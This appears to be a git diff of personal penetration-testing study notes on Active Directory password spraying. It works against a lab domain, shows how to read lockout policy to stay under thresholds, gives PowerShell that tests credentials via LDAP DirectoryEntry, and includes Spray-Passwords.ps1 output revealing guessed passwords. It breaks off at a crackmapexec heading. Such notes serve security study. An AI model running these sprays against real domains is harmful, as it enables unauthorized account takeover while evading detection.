@@ -1,4 +1,5 @@
 
+# AD Auth
 See [AD Authentication](Active%20Directory.md#Authentication) for in-depth explanation of NTLM and Kerberos auth processes.
 
 
@@ -162,4 +163,95 @@ sekurlsa::tickets
 
 # AD PW Attacks
 
+Before attempting brute forcing or wordlist auth attacks, it's important to consider account lockout.
+Too many attempts might yield a lockout or alert sysadmins of presence
+- Always best to get hash and crack offline
 
+
+- View account lockout policy
+```powershell
+net accounts
+	Force user logoff how long after time expires?:       Never
+	Minimum password age (days):                          1
+	Maximum password age (days):                          42
+	Minimum password length:                              7
+	Length of password history maintained:                24
+	Lockout threshold:                                    5
+	Lockout duration (minutes):                           30
+	Lockout observation window (minutes):                 30
+	Computer role:                                        WORKSTATION
+	The command completed successfully.
+```
+	- Lockout Threshold - Indicates 5 attempts before being locked out
+		- Can safely attempt 4 before risking a lock out.
+	- Lockout Observation Window - Indicates how long the lockout lasts.
+
+With the above info, assuming a user doesn't fail a login, we can safely attempt 192 logins in a 24-hour period against every domain user without triggering a lockout
+
+Most simple, but noisiest, password attack would be to compile a short list of most common passwords and spraying it against a massive amount of users.  But there are better ways:
+
+
+## LDAP & ADSI Spray
+
+Type of pw spraying attack which leverages the *DirectoryEntry* utilized in the [AD Enumeration LDAP](21%20-%20AD Enumeration.md#LDAP) section by making queries in the context of a different user.
+
+While previously we performed queries against the domain controller as a logged-in user with DirectoryEntry, here we'll make queries in the context of a different user by setting the DirectoryEntry instance.
+
+- Provide three arguments, including the LDAP path to the domain controller, the username, and the password to the *DirectoryEntry* constructor
+```powershell
+# Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Store the PdcRoleOwner name to the $PDC variable
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+# Construct LDAP path to search 
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+
+# Attempt
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+```
+
+- If the uname and pw are correct, the object will be created show the following results:
+```powershell
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+```
+
+- If the uname and pw are incorrect, the object will not be created and an exception will be shown:
+```powershell
+format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
+password is incorrect.
+"
+    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
+    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
+```
+
+### Spray-Passwords.ps1
+PS Script which uses the above ^ abilities to enumerate all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_
+
+```powershell
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+	WARNING: also targeting admin accounts.
+	Performing brute force - press [q] to stop the process and print results...
+	Guessed password for user: 'pete' = 'Nexus123!'
+	Guessed password for user: 'jen' = 'Nexus123!'
+	Users guessed are:
+	 'pete' with password: 'Nexus123!'
+	 'jen' with password: 'Nexus123!'
+```
+	- -Pass - Attempt with a single password
+	- -Admin - Also test admin accounts.
+
+
+## SMB AD Spray
+- One of the traditional approaches to pw spraying in AD envs.
+- Some drawbacks
+	- For every attempt, a full SMB conn has to be set up and terminated.
+		- Very noisy
+	- Quite slow
+
+### crackmapexec
